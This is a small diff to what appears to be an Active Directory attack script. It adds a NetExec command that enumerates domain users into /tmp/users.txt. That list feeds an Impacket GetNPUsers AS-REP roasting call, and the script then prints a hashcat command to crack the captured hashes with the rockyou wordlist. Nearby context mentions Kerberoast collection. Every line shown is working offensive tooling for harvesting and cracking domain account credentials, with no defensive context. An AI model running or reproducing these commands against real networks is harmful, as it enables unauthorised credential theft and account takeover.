@@ -88,6 +88,7 @@ def run():
             warn("Skipping Kerberoast SPN collection: credentials are required.")
 
     if c in ("7","A"):
+        run_cmd(f"nxc smb {dc} -u {user} -p {pw} -d {dom} --users | awk '/SMB/{{print $5}}' | grep -v '-' | grep -v '\\*' | tail -n +2 > /tmp/users.txt")
         run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
         info("Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")
 
